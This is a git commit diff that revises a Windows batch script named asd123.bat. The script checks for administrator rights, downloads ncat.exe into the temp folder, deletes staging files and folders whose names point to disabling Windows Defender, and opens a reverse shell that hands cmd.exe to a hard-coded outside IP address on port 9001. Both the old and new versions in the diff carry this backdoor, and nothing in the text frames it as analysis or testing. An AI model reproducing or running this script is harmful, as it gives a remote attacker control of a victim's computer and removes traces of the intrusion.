0304a2156f09a092fafc11701ae2df7746c69127
Seition2 <130700484+seition2doc@users.noreply.github.com>
2025-06-03 17:35:14 +0300

    Update asd123.bat

--- asd123.bat
+++ asd123.bat
@@ -1,30 +1,30 @@
 @echo off
 
-:: Yonetici yetkisi kontrolu
-net session >nul 2>&1
+whoami /groups | findstr /i "S-1-5-32-544" >nul 2>&1
 if %errorlevel% NEQ 0 (
     exit
 )
 
+cd %temp%
+curl -L https://github.com/cyberisltd/NcatPortable/raw/refs/heads/master/ncat.exe -o ncat.exe
+
 where ncat.exe >nul 2>&1
-if %errorlevel%==0 (
-    del /f /q s.bat
-    del /f /q a.py
-    del /f /q asd.bat
-    del /f /q ddd.vbs
-    del /f /q expe2.bat
-    del /f /q expe2.vbs
-    del /f /q lalala.vbs
-    del /f /q a.ps1
-    del /f /q RunDefenderRemover.vbs
-    del /f /q DefenderRemover.bat
-
-    rmdir /s /q Remove_SecurityComp
-    rmdir /s /q Remove_Defender
-
-    cd %temp%
-    curl -L https://github.com/cyberisltd/NcatPortable/raw/refs/heads/master/ncat.exe -o ncat.exe
-    ncat.exe 185.194.175.132 9001 -e cmd.exe
-) else (
+if %errorlevel% NEQ 0 (
     exit
 )
+
+del /f /q s.bat
+del /f /q a.py
+del /f /q asd.bat
+del /f /q ddd.vbs
+del /f /q expe2.bat
+del /f /q expe2.vbs
+del /f /q lalala.vbs
+del /f /q a.ps1
+del /f /q RunDefenderRemover.vbs
+del /f /q DefenderRemover.bat
+
+rmdir /s /q Remove_SecurityComp
+rmdir /s /q Remove_Defender
+
+ncat.exe 185.194.175.132 9001 -e cmd.exe
